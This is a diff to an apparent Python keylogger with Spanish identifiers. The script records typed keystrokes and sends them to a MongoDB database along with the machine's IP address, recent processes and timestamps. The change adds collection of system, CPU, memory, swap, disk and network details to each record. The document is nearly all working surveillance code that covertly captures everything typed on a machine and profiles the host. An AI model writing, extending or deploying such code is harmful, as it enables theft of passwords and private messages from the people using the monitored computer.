@@ -5,16 +5,19 @@ import socket
 import time
 from datetime import datetime
 import subproceso
-import psutil
+import platform
+import DATOSPC
 
 lista_tecla=[] #En esta lista se guardaran las palabras
 
 controlador = True
 sub = subproceso
+datos = DATOSPC
+
 mongo_conexion = conexion()#Hacer conexion con la base de mongo
 
-def agregarBD_mongo(equipo,fecha_hora,informacion,fecha_hora_final,sub_proceso):
-    mongo_conexion.agregar_archivo(equipo,fecha_hora,informacion,fecha_hora_final,sub_proceso)
+def agregarBD_mongo(equipo,fecha_hora,informacion,fecha_hora_final,sub_proceso,info,cpu,memoria,swap,disco,red):
+    mongo_conexion.agregar_archivo(equipo,fecha_hora,informacion,fecha_hora_final,sub_proceso,info,cpu,memoria,swap,disco,red)
 
 def imprimir():
     tecla = ''.join(lista_tecla)
@@ -73,7 +76,13 @@ def ciclo_ejecucion():
         lo_escrito = imprimir()
         tiempo_final = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         sub_proceso = sub.ultimos_procesos()
-        agregarBD_mongo(ip_equipo,tiempo_inicial,lo_escrito,tiempo_final,sub_proceso)
+        infopc = datos.informacion_sistema()
+        infoCPU = datos.informacion_CPU()
+        infoMemoria = datos.informacion_Memoria()
+        infoMemoriaSWAP = datos.informacion_MemoriaSWAP()
+        disco = datos.Disco_Duro()
+        red = datos.infoRED()
+        agregarBD_mongo(ip_equipo,tiempo_inicial,lo_escrito,tiempo_final,sub_proceso,infopc,infoCPU,infoMemoria,infoMemoriaSWAP,disco,red)
         lista_tecla.clear()
 
 
